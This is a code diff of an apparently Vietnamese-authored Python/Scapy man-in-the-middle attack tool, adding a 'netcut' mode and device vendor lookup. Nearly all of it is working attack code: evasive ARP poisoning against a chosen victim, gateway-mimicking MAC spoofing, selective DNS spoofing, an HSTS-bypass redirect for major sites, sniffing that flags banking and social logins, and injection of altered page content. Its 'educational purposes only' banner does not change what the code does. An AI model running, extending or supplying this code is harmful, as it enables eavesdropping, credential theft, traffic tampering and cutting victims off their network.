@@ -2,7 +2,7 @@ from scapy.all import (
     ARP, Ether, IP, UDP, DNS, DNSQR, DNSRR, Raw, sniff, send, TCP,
     arping, get_if_hwaddr, conf, IPv6, ICMPv6ND_NS, ICMPv6ND_NA,
     ICMPv6NDOptDstLLAddr, ICMPv6NDOptSrcLLAddr, in6_getifaddr,
-    AsyncSniffer, wrpcap
+    AsyncSniffer, wrpcap, sendp
 )
 from scapy.layers.tls.all import TLSClientHello, TLS_Ext_ServerName
 import netifaces as ni
@@ -19,10 +19,8 @@ from rich.prompt import Prompt, Confirm
 from rich.live import Live
 from rich.layout import Layout
 from rich.panel import Panel
-from rich.progress import Progress, SpinnerColumn, TextColumn
 from rich.text import Text
 from rich.align import Align
-from rich.columns import Columns
 
 # Windows specific
 if platform.system() == "Windows":
@@ -34,6 +32,67 @@ if platform.system() == "Windows":
     from scapy.arch.windows import get_windows_if_list
 
 console = Console()
+
+# ==================== VENDOR LOOKUP ====================
+def get_vendor_from_mac(mac):
+    """Tra cứu vendor từ MAC address sử dụng Scapy manufdb"""
+    try:
+        # Scapy's built-in manufacturer database
+        vendor = conf.manufdb._resolve_MAC(mac)
+        if vendor:
+            # Rút gọn tên vendor nếu quá dài
+            return vendor[:30] if len(vendor) > 30 else vendor
+        return "Unknown"
+    except:
+        return "Unknown"
+
+# ==================== NETWORK SCANNER WITH VENDOR ====================
+def scan_network(iface):
+    """Quét mạng và hiển thị IP, MAC, Vendor"""
+    try:
+        from scapy.all import get_if_addr
+        my_ip = get_if_addr(iface)
+        network = '.'.join(my_ip.split('.')[:3] + ['0/24'])
+    except:
+        console.print("[red]❌ Cannot get interface IP[/red]")
+        return []
+    
+    console.print(f"[yellow]🔍 Scanning network {network} on {iface}...[/yellow]")
+    
+    try:
+        ans, _ = arping(network, iface=iface, verbose=0, timeout=3)
+    except Exception as e:
+        console.print(f"[red]❌ Scan error: {e}[/red]")
+        return []
+    
+    devices = []
+    for sent, recv in ans:
+        mac = recv.hwsrc
+        vendor = get_vendor_from_mac(mac)
+        
+        devices.append({
+            'ip': recv.psrc,
+            'mac': mac,
+            'vendor': vendor
+        })
+    
+    if not devices:
+        console.print("[red]❌ No devices found[/red]")
+        return []
+    
+    # Display table with Vendor column
+    table = Table(title=f"🌐 Found {len(devices)} Devices")
+    table.add_column("No.", style="cyan", width=4)
+    table.add_column("IP Address", style="green")
+    table.add_column("MAC Address", style="magenta")
+    table.add_column("Vendor", style="yellow")
+    
+    for idx, d in enumerate(devices, 1):
+        table.add_row(str(idx), d['ip'], d['mac'], d['vendor'])
+    
+    console.print(table)
+    
+    return devices
 
 # ==================== ENHANCED LOGGER ====================
 class EnhancedLogger:
@@ -82,20 +141,6 @@ class EnhancedLogger:
 # ==================== OS FINGERPRINTING ====================
 class OSFingerprinter:
     """Phát hiện HĐH từ TCP/IP characteristics"""
-    
-    OS_SIGNATURES = {
-        # TTL-based detection
-        (64, "Linux/Unix"),
-        (128, "Windows"),
-        (255, "Cisco/Network Device"),
-        (32, "Windows 95/98"),
-        
-        # Window size patterns
-        (8192, "Linux (Older kernel)"),
-        (65535, "FreeBSD/OpenBSD"),
-        (5840, "Windows XP"),
-        (8760, "Windows 7/8/10"),
-    }
     
     def __init__(self):
         self.fingerprints = {}
@@ -161,7 +206,6 @@ class OSFingerprinter:
 class HSTSBypass:
     """Bypass HSTS bằng DNS Spoofing nâng cao"""
     
-    # Mapping domains to non-HSTS variants
     HSTS_BYPASS_MAP = {
         'facebook.com': 'wwww.facebook.com',
         'google.com': 'ww01.google.com',
@@ -193,7 +237,7 @@ class HSTSBypass:
                     id=pkt[DNS].id,
                     qr=1, aa=1, qd=pkt[DNS].qd,
                     an=DNSRR(
-                        rrname=bypass_domain,  # Trả về domain không HSTS
+                        rrname=bypass_domain,
                         ttl=10,
                         rdata=self.attacker_ip
                     )
@@ -241,7 +285,6 @@ class InternalForwarder:
     def forward_packet(self, pkt):
         """Forward packet với modification"""
         try:
-            # Skip non-IP packets
             if not pkt.haslayer(IP):
                 return
             
@@ -249,13 +292,11 @@ class InternalForwarder:
             if pkt[IP].src == self.victim_ip:
                 # Victim -> Gateway
                 new_pkt = Ether(src=get_if_hwaddr(self.iface), dst=self.gateway_mac)
-                direction = "OUT"
             elif pkt[IP].dst == self.victim_ip:
                 # Gateway -> Victim
                 new_pkt = Ether(src=get_if_hwaddr(self.iface), dst=self.victim_mac)
-                direction = "IN"
             else:
-                return  # Not our business
+                return
             
             # Copy IP layer onwards
             new_pkt = new_pkt / pkt[IP].copy()
@@ -266,7 +307,6 @@ class InternalForwarder:
                 modified_payload = self.modify_payload(original_payload)
                 
                 if modified_payload != original_payload:
-                    # Rebuild packet with new payload
                     del new_pkt[Raw]
                     new_pkt = new_pkt / Raw(load=modified_payload)
                     
@@ -279,7 +319,7 @@ class InternalForwarder:
                         del new_pkt[UDP].chksum
             
             # Send modified packet
-            send(new_pkt, verbose=0, iface=self.iface)
+            sendp(new_pkt, verbose=0, iface=self.iface)
             self.packets_forwarded += 1
             
         except Exception as e:
@@ -324,19 +364,17 @@ class AdaptiveARPSpoofer:
         self.running = False
         
         # Adaptive parameters
-        self.min_interval = 0.5  # Lower minimum for more randomization
-        self.max_interval = 7.0  # Higher maximum for more randomization
+        self.min_interval = 0.5
+        self.max_interval = 7.0
         self.current_interval = random.uniform(self.min_interval, self.max_interval)
         self.last_activity = time.time()
-        self.activity_threshold = 10  # seconds
-        self.jitter = 0.3  # Jitter factor (seconds)
+        self.activity_threshold = 10
+        self.jitter = 0.3
     
     def update_activity(self):
         """Cập nhật thời gian activity"""
         self.last_activity = time.time()
-        # Giảm interval khi active, add randomization
         self.current_interval = max(self.min_interval, self.current_interval * random.uniform(0.7, 0.95))
-        # Add jitter
         self.current_interval += random.uniform(-self.jitter, self.jitter)
         self.current_interval = max(self.min_interval, min(self.current_interval, self.max_interval))
     
@@ -344,9 +382,7 @@ class AdaptiveARPSpoofer:
         """Kiểm tra nếu victim idle"""
         idle_time = time.time() - self.last_activity
         if idle_time > self.activity_threshold:
-            # Tăng interval khi idle, add randomization
             self.current_interval = min(self.max_interval, self.current_interval * random.uniform(1.05, 1.25))
-            # Add jitter
             self.current_interval += random.uniform(-self.jitter, self.jitter)
             self.current_interval = max(self.min_interval, min(self.current_interval, self.max_interval))
     
@@ -355,14 +391,14 @@ class AdaptiveARPSpoofer:
         self.running = True
         while self.running:
             try:
-                # Kiểm tra idle status
                 self.check_idle()
+                
                 # Send ARP packets
                 send(ARP(op=2, pdst=self.victim_ip, psrc=self.gateway_ip,
                         hwdst=self.victim_mac, hwsrc=self.my_mac), verbose=0)
                 send(ARP(op=2, pdst=self.gateway_ip, psrc=self.victim_ip,
                         hwdst=self.gateway_mac, hwsrc=self.my_mac), verbose=0)
-                # Sleep với interval adaptive + extra random jitter
+                
                 sleep_time = self.current_interval + random.uniform(-self.jitter, self.jitter)
                 sleep_time = max(self.min_interval, min(sleep_time, self.max_interval))
                 time.sleep(sleep_time)
@@ -373,7 +409,7 @@ class AdaptiveARPSpoofer:
     def start(self):
         """Bắt đầu spoofing"""
         threading.Thread(target=self.spoof, daemon=True).start()
-        console.print(f"[green]⚔️ Adaptive ARP Spoofing started (interval: {self.current_interval}s)[/green]")
+        console.print(f"[green]⚔️ Adaptive ARP Spoofing started (interval: {self.current_interval:.1f}s)[/green]")
     
     def stop(self):
         """Dừng spoofing"""
@@ -396,14 +432,13 @@ class MACRandomizer:
         self.original_mac = get_if_hwaddr(iface)
     
     def randomize(self, vendor='random', gateway_mac=None):
-        """Đổi MAC sang random hoặc vendor cụ thể, hoặc theo gateway MAC"""
+        """Đổi MAC sang random hoặc vendor cụ thể"""
         try:
             chosen_prefix = None
             chosen_vendor = vendor
+            
             if gateway_mac:
-                # Extract vendor prefix from gateway MAC
                 prefix = ':'.join(gateway_mac.split(':')[:3])
-                # Try to match with known vendors
                 for v, prefixes in self.VENDOR_PREFIXES.items():
                     if prefix in prefixes:
                         chosen_prefix = prefix
@@ -415,9 +450,10 @@ class MACRandomizer:
                 if vendor == 'random':
                     chosen_vendor = random.choice(list(self.VENDOR_PREFIXES.keys()))
                 chosen_prefix = random.choice(self.VENDOR_PREFIXES.get(chosen_vendor, ['00:11:22']))
+            
             suffix = ':'.join([f"{random.randint(0, 255):02x}" for _ in range(3)])
             new_mac = f"{chosen_prefix}:{suffix}"
-            # Change MAC (platform specific)
+            
             if platform.system() == 'Linux':
                 subprocess.run(['ifconfig', self.iface, 'down'], stderr=subprocess.DEVNULL)
                 subprocess.run(['ifconfig', self.iface, 'hw', 'ether', new_mac], stderr=subprocess.DEVNULL)
@@ -447,13 +483,13 @@ class SelectiveDNSSpoofer:
     """DNS Spoofing cho danh sách domain cụ thể"""
     
     def __init__(self, target_domains, fake_ip, rate_limit_per_domain=5, rate_limit_window=10):
-        self.target_domains = target_domains  # List of domains to spoof
+        self.target_domains = target_domains
         self.fake_ip = fake_ip
         self.spoofed_queries = defaultdict(int)
         self.running = False
         self.rate_limit_per_domain = rate_limit_per_domain
-        self.rate_limit_window = rate_limit_window  # seconds
-        self.domain_timestamps = defaultdict(deque)  # domain: deque of timestamps
+        self.rate_limit_window = rate_limit_window
+        self.domain_timestamps = defaultdict(deque)
     
     def should_spoof(self, domain):
         """Kiểm tra nếu domain cần spoof"""
@@ -466,15 +502,18 @@ class SelectiveDNSSpoofer:
         """Xử lý DNS query với rate limit"""
         if not self.running or not pkt.haslayer(DNSQR):
             return
+        
         try:
             query = pkt[DNSQR].qname.decode('utf-8').rstrip('.')
-            # Chỉ spoof nếu trong target list
+            
             if self.should_spoof(query):
                 now = time.time()
                 timestamps = self.domain_timestamps[query]
+                
                 # Remove old timestamps
                 while timestamps and now - timestamps[0] > self.rate_limit_window:
                     timestamps.popleft()
+                
                 if len(timestamps) < self.rate_limit_per_domain:
                     fake_dns = (
                         Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) /
@@ -486,12 +525,11 @@ class SelectiveDNSSpoofer:
                             an=DNSRR(rrname=query, ttl=10, rdata=self.fake_ip)
                         )
                     )
+                    
                     send(fake_dns, verbose=0)
                     self.spoofed_queries[query] += 1
                     timestamps.append(now)
                     console.print(f"[red]🎯 DNS Spoofed (Selective):[/red] {query} → {self.fake_ip}")
-                else:
-                    console.print(f"[yellow]⏳ DNS spoof rate limit reached for {query}[/yellow]")
         except:
             pass
     
@@ -533,17 +571,10 @@ class AdvancedDashboard:
             'sensitive_alerts': []
         }
         
-        # Traffic sparkline data
-        self.device_identifier = DeviceIdentifier()
-        self.traffic_history = deque(maxlen=50)  # Last 50 seconds
+        self.traffic_history = deque(maxlen=50)
         self.last_packet_count = 0
-        
-        # Live stream URLs
         self.recent_urls = deque(maxlen=15)
-        
-        # Sensitive captures
         self.sensitive_data = []
-        
         self.running = False
         self.live = None
     
@@ -602,14 +633,12 @@ class AdvancedDashboard:
         """Tạo layout 3 cột"""
         layout = Layout()
         
-        # Split thành header và body
         layout.split_column(
             Layout(name="header", size=3),
             Layout(name="body"),
             Layout(name="footer", size=4)
         )
         
-        # Split body thành 3 cột
         layout["body"].split_row(
             Layout(name="left", ratio=1),
             Layout(name="center", ratio=2),
@@ -622,7 +651,7 @@ class AdvancedDashboard:
         
         layout["header"].update(
             Panel(
-                f"[bold red]⚔️  MITM FRAMEWORK v3.0 - PROFESSIONAL EDITION[/bold red] | ⏱️  {mins:02d}:{secs:02d}",
+                f"[bold red]⚔️  MITM FRAMEWORK v3.0 - {self.attacker.mode.upper()} MODE[/bold red] | ⏱️  {mins:02d}:{secs:02d}",
                 style="bold red"
             )
         )
@@ -646,7 +675,7 @@ MAC: {self.attacker.gateway_mac[:17]}
 
 [cyan]📊 STATUS[/cyan]
 ARP: [green]ACTIVE[/green]
-Forwarder: [green]RUNNING[/green]
+Forwarder: {'[red]DISABLED[/red]' if self.attacker.mode == 'netcut' else '[green]RUNNING[/green]'}
 """
         
         layout["left"].update(
@@ -663,7 +692,7 @@ Forwarder: [green]RUNNING[/green]
 {sparkline}
 Rate: {max_rate} pkt/s
 
-[yellow]🌍 RECENT URLS[/yellow]
+[yellow]🌐 RECENT URLS[/yellow]
 {url_stream}
 
 [yellow]📈 STATISTICS[/yellow]
@@ -703,7 +732,7 @@ Alerts: {len(self.stats.get('sensitive_alerts', []))}
             Panel(
                 Align.center(
                     "[dim]Press Ctrl+C to stop attack and restore network\n"
-                    "All traffic is being logged to ./mitm_logs_v3/[/dim]"
+                    f"Mode: {self.attacker.mode.upper()} | All traffic is being logged to ./mitm_logs_v3/[/dim]"
                 ),
                 style="dim"
             )
@@ -723,7 +752,6 @@ Alerts: {len(self.stats.get('sensitive_alerts', []))}
             self.stats['sensitive_alerts'] = []
         self.stats['sensitive_alerts'].append(alert)
         
-        # Hiển thị alert nổi bật
         console.print(f"\n[bold red]🚨 SENSITIVE SITE DETECTED![/bold red]")
         console.print(f"[red]Type:[/red] {site_type}")
         console.print(f"[red]URL:[/red] {url}\n")
@@ -732,86 +760,10 @@ Alerts: {len(self.stats.get('sensitive_alerts', []))}
         """Dừng dashboard"""
         self.running = False
 
-
-class DeviceIdentifier:
-    """Identify device vendor and type from MAC and heuristics (offline OUI lookup)."""
-    # Minimal OUI database (expandable)
-    OUI_DB = {
-        # Apple
-        '00:03:93': ('Apple', 'Phone/Laptop'),
-        '00:05:02': ('Apple', 'Phone/Laptop'),
-        '00:0a:95': ('Apple', 'Phone/Laptop'),
-        '00:0d:93': ('Apple', 'Phone/Laptop'),
-        # Samsung
-        '00:16:6c': ('Samsung', 'Android Phone'),
-        'f0:27:65': ('Samsung', 'Android Phone'),
-        # Intel
-        '00:13:e8': ('Intel', 'Laptop/PC'),
-        '00:1b:21': ('Intel', 'Laptop/PC'),
-        # Cisco
-        '00:40:96': ('Cisco', 'Network Device'),
-        '00:0f:f7': ('Cisco', 'Network Device'),
-        # TP-Link
-        'b0:4e:26': ('TP-Link', 'Router'),
-        'f4:f2:6d': ('TP-Link', 'Router'),
-        # MikroTik
-        '4c:5e:0c': ('MikroTik', 'Network Device'),
-        # Dell
-        '00:14:22': ('Dell', 'Laptop/PC'),
-        # HP
-        '00:1f:29': ('HP', 'Laptop/PC'),
-        # Lenovo
-        '00:21:5c': ('Lenovo', 'Laptop/PC'),
-        # Generic
-        '00:11:22': ('Unknown Vendor', 'Unknown'),
-    }
-
-    def __init__(self, extra_oui_db=None):
-        self.oui_db = dict(self.OUI_DB)
-        if extra_oui_db:
-            self.oui_db.update(extra_oui_db)
-
-    def lookup_vendor(self, mac):
-        """Return (vendor, default_type) from MAC address OUI."""
-        if not mac or len(mac) < 8:
-            return ("Unknown Vendor", "Unknown")
-        oui = mac.lower()[0:8]
-        oui = oui.replace('-', ':')
-        return self.oui_db.get(oui, ("Unknown Vendor", "Unknown"))
-
-    def infer_type(self, vendor, ttl=None):
-        """Heuristically infer device type from vendor and TTL."""
-        if vendor == 'Apple':
-            if ttl is not None and 60 <= ttl <= 70:
-                return 'iPhone/iPad'
-            elif ttl is not None and 120 <= ttl <= 130:
-                return 'Mac'
-            else:
-                return 'Apple Device'
-        if vendor == 'Samsung':
-            return 'Android Phone'
-        if vendor in ('Intel', 'Dell', 'HP', 'Lenovo'):
-            return 'Laptop/PC'
-        if vendor in ('Cisco', 'MikroTik', 'TP-Link'):
-            return 'Network Device'
-        return 'Unknown'
-
-    def identify(self, ip, mac, ttl=None):
-        vendor, default_type = self.lookup_vendor(mac)
-        device_type = self.infer_type(vendor, ttl) if vendor != 'Unknown Vendor' else default_type
-        return {
-            'ip': ip,
-            'mac': mac,
-            'vendor': vendor,
-            'type': device_type
-        }
-    
-    
-    # ==================== ENHANCED ATTACKER ====================
+# ==================== ENHANCED ATTACKER ====================
 class EnhancedAttacker:
     """Core engine với tất cả tính năng nâng cao"""
     
-    # Sensitive site patterns
     SENSITIVE_PATTERNS = {
         'banking': ['bank', 'banking', 'vietcombank', 'techcombank', 'vcb', 'mbbank'],
         'social': ['facebook', 'twitter', 'instagram', 'linkedin', 'tiktok'],
@@ -824,7 +776,7 @@ class EnhancedAttacker:
         self.victim_ip = victim_ip
         self.gateway_ip = gateway_ip
         self.iface = iface
-        self.mode = "netcut"
+        self.mode = "monitor"
         self.running = False
         
         # Enhanced components
@@ -848,7 +800,7 @@ class EnhancedAttacker:
         # Initialize components
         self.mac_randomizer = MACRandomizer(iface)
         self.adaptive_spoofer = AdaptiveARPSpoofer(
-            victim_ip, gateway_ip, 
+            victim_ip, gateway_ip,
             self.victim_mac, self.gateway_mac,
             self.my_mac, iface
         )
@@ -891,7 +843,7 @@ class EnhancedAttacker:
         """Enhanced packet analysis"""
         try:
             # OS Fingerprinting
-            if pkt.haslayer(TCP) and pkt[TCP].flags & 0x02:  # SYN flag
+            if pkt.haslayer(TCP) and pkt[TCP].flags & 0x02:
                 is_new, os_info = self.os_fingerprinter.analyze_packet(pkt)
                 if is_new:
                     console.print(f"[green]🖥️  OS Detected:[/green] {os_info['os']} (Confidence: {os_info['confidence']}%)")
@@ -908,18 +860,18 @@ class EnhancedAttacker:
                     if hasattr(client_hello, 'ext'):
                         for ext in client_hello.ext:
                             if isinstance(ext, TLS_Ext_ServerName):
-                                for servername in ext.servernames:
-                                    hostname = servername.servername.decode('utf-8')
-                                    
-                                    # Check sensitive
-                                    is_sensitive, site_type = self.detect_sensitive_site(hostname)
-                                    if is_sensitive:
-                                        self.dashboard.add_sensitive_alert(site_type, hostname)
-                                        self.logger.log_sensitive_access(self.victim_ip, site_type, hostname)
-                                    
-                                    if self.dashboard:
-                                        self.dashboard.add_url(hostname, "HTTPS")
-                                        self.dashboard.increment('https_requests')
+                                if hasattr(ext, 'servernames'):
+                                    for servername in ext.servernames:
+                                        hostname = servername.servername.decode('utf-8')
+                                        
+                                        is_sensitive, site_type = self.detect_sensitive_site(hostname)
+                                        if is_sensitive:
+                                            self.dashboard.add_sensitive_alert(site_type, hostname)
+                                            self.logger.log_sensitive_access(self.victim_ip, site_type, hostname)
+                                        
+                                        if self.dashboard:
+                                            self.dashboard.add_url(hostname, "HTTPS")
+                                            self.dashboard.increment('https_requests')
                 except:
                     pass
             
@@ -929,7 +881,6 @@ class EnhancedAttacker:
                     query = pkt[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')
                     
                     if query and not query.startswith('_'):
-                        # Check HSTS bypass
                         should_bypass, bypass_domain = self.hsts_bypass.should_bypass(query)
                         if should_bypass:
                             fake_pkt = self.hsts_bypass.create_bypass_response(pkt, bypass_domain)
@@ -961,7 +912,6 @@ class EnhancedAttacker:
                                 path = lines[0].split(' ')[1] if len(lines[0].split(' ')) > 1 else '/'
                                 full_url = f"{host}{path}"
                                 
-                                # Check sensitive
                                 is_sensitive, site_type = self.detect_sensitive_site(full_url)
                                 if is_sensitive:
                                     self.dashboard.add_sensitive_alert(site_type, full_url)
@@ -1024,7 +974,6 @@ class EnhancedAttacker:
             
             self.sniffer.start()
             
-            # Keep alive
             while self.running:
                 time.sleep(0.1)
             
@@ -1033,36 +982,72 @@ class EnhancedAttacker:
         except Exception as e:
             console.print(f"[red]❌ Sniff error: {e}[/red]")
     
-    def start(self, mode='mitm', randomize_mac=False, selective_dns_targets=None):
-        """Khởi động attack với tất cả tính năng"""
+    def start(self, mode='monitor', randomize_mac=False, selective_dns_targets=None):
+        """
+        Khởi động attack với mode cụ thể
+        
+        Modes:
+        - netcut: Cắt mạng nạn nhân (không forward)
+        - monitor: Giám sát passive (forward bình thường)
+        - active: MITM active với modification (forward + modify)
+        """
         self.mode = mode
+        self.running = True
+        
         # MAC Randomization
-        if randomize_mac and Confirm.ask("Randomize MAC address?"):
+        if randomize_mac:
             self.mac_randomizer.randomize(gateway_mac=self.gateway_mac)
         
         # Setup dashboard
         self.dashboard = AdvancedDashboard(self)
         self.dashboard.start()
         
-        if mode == 'mitm':
-            console.print("[blue]🕵️  Mode: ADVANCED MITM[/blue]")
+        # Start adaptive ARP spoofing (Chạy cho TẤT CẢ modes)
+        self.adaptive_spoofer.start()
+        
+        if mode == 'netcut':
+            # ========== NETCUT MODE: CẮT MẠNG ==========
+            console.print("[bold red]🔪 Mode: NETCUT - Network Cut Attack[/bold red]")
+            console.print("[yellow]⚠️  Victim will LOSE internet connection![/yellow]")
             
-            # Enable IP forwarding
+            # TẮT IP Forwarding để không forward packets
+            self.set_ip_forward(False)
+            
+            # KHÔNG khởi động Internal Forwarder
+            # Packets sẽ bị drop hoàn toàn
+            
+            # Vẫn sniff để monitor (optional)
+            threading.Thread(target=self.mitm_sniff, daemon=True).start()
+        
+        elif mode == 'monitor':
+            # ========== MONITOR MODE: PASSIVE SNIFFING ==========
+            console.print("[blue]👁️  Mode: MONITOR - Passive Sniffing[/blue]")
+            
+            # BẬT IP Forwarding
             self.set_ip_forward(True)
             
-            # Start adaptive ARP spoofing
-            self.adaptive_spoofer.start()
-            
-            # Start internal forwarder
+            # Khởi động Internal Forwarder (forward bình thường)
             self.internal_forwarder.start()
             
-            # Add payload modification rules
-            # Example: Replace all "Google" with "Googl3"
+            # Sniff để monitor traffic
+            threading.Thread(target=self.mitm_sniff, daemon=True).start()
+        
+        elif mode == 'active':
+            # ========== ACTIVE MODE: MITM + MODIFICATION ==========
+            console.print("[red]⚔️  Mode: ACTIVE MITM - Traffic Modification[/red]")
+            
+            # BẬT IP Forwarding
+            self.set_ip_forward(True)
+            
+            # Khởi động Internal Forwarder
+            self.internal_forwarder.start()
+            
+            # Thêm payload modification rules
+            self.internal_forwarder.add_modification_rule("<title>", "<title>[PWNED] ")
             self.internal_forwarder.add_modification_rule("Google", "Googl3")
             
-            # Selective DNS spoofing
+            # Selective DNS spoofing (nếu có)
             if selective_dns_targets:
-                # DNS spoof rate limit: 5 per 10 seconds per domain
                 self.selective_dns = SelectiveDNSSpoofer(
                     selective_dns_targets,
                     self.get_my_ip(),
@@ -1071,7 +1056,7 @@ class EnhancedAttacker:
                 )
                 self.selective_dns.start(self.iface)
             
-            # Start packet sniffing
+            # Sniff để monitor + capture
             threading.Thread(target=self.mitm_sniff, daemon=True).start()
         
         # Update dashboard stats periodically
@@ -1086,6 +1071,8 @@ class EnhancedAttacker:
                 time.sleep(1)
         
         threading.Thread(target=update_stats, daemon=True).start()
+        
+        console.print(f"[bold green]✅ Attack started in {mode.upper()} mode![/bold green]")
     
     def set_ip_forward(self, enable):
         """Enable/disable IP forwarding"""
@@ -1093,7 +1080,8 @@ class EnhancedAttacker:
             try:
                 with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                     f.write('1\n' if enable else '0\n')
-                console.print(f"[yellow]⚙️  IP Forwarding: {'ON' if enable else 'OFF'}[/yellow]")
+                status = "ON" if enable else "OFF"
+                console.print(f"[yellow]⚙️  IP Forwarding: {status}[/yellow]")
             except:
                 pass
     
@@ -1101,7 +1089,6 @@ class EnhancedAttacker:
         """Dừng tất cả và khôi phục"""
         self.running = False
         
-        # Stop dashboard
         if self.dashboard:
             self.dashboard.stop()
         
@@ -1124,7 +1111,7 @@ class EnhancedAttacker:
                 pass
         
         # Restore ARP
-        console.print("[cyan]📡 Restoring ARP tables...[/cyan]")
+        console.print("[cyan]🔡 Restoring ARP tables...[/cyan]")
         for _ in range(30):
             try:
                 send(ARP(op=2, pdst=self.victim_ip, psrc=self.gateway_ip,
@@ -1207,70 +1194,88 @@ if __name__ == "__main__":
         check_privileges()
         
         # Banner
-        console.rule("[bold red]🔥 ADVANCED MITM FRAMEWORK v3.0 🔥[/bold red]")
-        console.print("[yellow]⚠️  WARNING: Educational/Testing purposes ONLY![/yellow]\n")
+        banner = """
+[bold red]
+╔══════════════════════════════════════════════════════════════╗
+║          🔥 ADVANCED MITM FRAMEWORK v3.0 🔥                 ║
+║                                                              ║
+║  Features:                                                   ║
+║  • NetCut Mode - Cut victim's network                       ║
+║  • Vendor Detection - Identify devices by manufacturer      ║
+║  • OS Fingerprinting - Detect victim's operating system     ║
+║  • Adaptive ARP Spoofing - Intelligent timing               ║
+║  • Real-time Dashboard - Live traffic monitoring            ║
+║                                                              ║
+║  ⚠️  FOR EDUCATIONAL/TESTING PURPOSES ONLY ⚠️               ║
+╚══════════════════════════════════════════════════════════════╝
+[/bold red]
+"""
+        console.print(banner)
         
         # Select interface
         iface = select_interface()
         
-        # Scan network
-        from scapy.all import arping
-        console.print(f"[yellow]🔍 Scanning network on {iface}...[/yellow]")
+        # Scan network với Vendor detection
+        devices = scan_network(iface)
         
-        # Get my IP
+        if not devices:
+            sys.exit(1)
+        
+        # Select target
+        victim_ip = Prompt.ask("\n🎯 Select Victim IP", choices=[d['ip'] for d in devices])
+        
+        # Get network info
         try:
             from scapy.all import get_if_addr
             my_ip = get_if_addr(iface)
-            network = '.'.join(my_ip.split('.')[:3] + ['0/24'])
+            network = '.'.join(my_ip.split('.')[:3] + ['.1'])
         except:
-            console.print("[red]❌ Cannot get interface IP[/red]")
-            sys.exit(1)
+            network = '.'.join(victim_ip.split('.')[:3] + ['.1'])
         
-        ans, _ = arping(network, iface=iface, verbose=0, timeout=3)
+        gateway_ip = Prompt.ask("🌐 Gateway IP", default=network)
         
-        devices = []
-        for sent, recv in ans:
-            devices.append({
-                'ip': recv.psrc,
-                'mac': recv.hwsrc
-            })
+        # ========== MODE SELECTION ==========
+        console.print("\n[bold cyan]⚙️  Select Attack Mode:[/bold cyan]")
+        console.print("[yellow]1. netcut  - Cut victim's network (NO forwarding)[/yellow]")
+        console.print("[yellow]2. monitor - Passive sniffing (with forwarding)[/yellow]")
+        console.print("[yellow]3. active  - Active MITM with payload modification[/yellow]")
         
-        if not devices:
-            console.print("[red]❌ No devices found[/red]")
-            sys.exit(1)
+        mode = Prompt.ask(
+            "\n🎯 Attack Mode",
+            choices=["netcut", "monitor", "active"],
+            default="netcut"
+        )
         
-        # Display devices
-        table = Table(title="🌐 Devices Found")
-        table.add_column("IP", style="cyan")
-        table.add_column("MAC", style="magenta")
-        
-        for d in devices:
-            table.add_row(d['ip'], d['mac'])
-        
-        console.print(table)
-        
-        # Select target
-        victim_ip = Prompt.ask("Enter Victim IP", choices=[d['ip'] for d in devices])
-        gateway_ip = Prompt.ask("Enter Gateway IP", default=network.replace('0/24', '1'))
-        
-        # Attack options
-        console.print("\n[bold cyan]⚙️  Attack Configuration:[/bold cyan]")
+        # Additional options
+        console.print("\n[bold cyan]⚙️  Additional Options:[/bold cyan]")
         randomize_mac = Confirm.ask("Randomize MAC address?", default=False)
         
-        use_selective_dns = Confirm.ask("Use selective DNS spoofing?", default=False)
+        use_selective_dns = False
         selective_targets = None
         
-        if use_selective_dns:
-            console.print("[yellow]Enter target domains (comma-separated):[/yellow]")
-            console.print("[dim]Example: facebook.com,google.com,twitter.com[/dim]")
-            targets_input = Prompt.ask("Domains")
-            selective_targets = [t.strip() for t in targets_input.split(',')]
+        if mode == 'active':
+            use_selective_dns = Confirm.ask("Use selective DNS spoofing?", default=False)
+            
+            if use_selective_dns:
+                console.print("[yellow]Enter target domains (comma-separated):[/yellow]")
+                console.print("[dim]Example: facebook.com,google.com,twitter.com[/dim]")
+                targets_input = Prompt.ask("Domains")
+                selective_targets = [t.strip() for t in targets_input.split(',')]
+        
+        # Confirmation
+        console.print(f"\n[bold yellow]⚠️  About to start {mode.upper()} attack on {victim_ip}[/bold yellow]")
+        
+        if mode == 'netcut':
+            console.print("[red]⚠️  WARNING: Victim will LOSE internet connection![/red]")
+        
+        if not Confirm.ask("Continue?", default=True):
+            console.print("[yellow]Attack cancelled.[/yellow]")
+            sys.exit(0)
         
         # Start attack
         attacker = EnhancedAttacker(victim_ip, gateway_ip, iface)
-        attacker.running = True
         attacker.start(
-            mode='mitm',
+            mode=mode,
             randomize_mac=randomize_mac,
             selective_dns_targets=selective_targets
         )
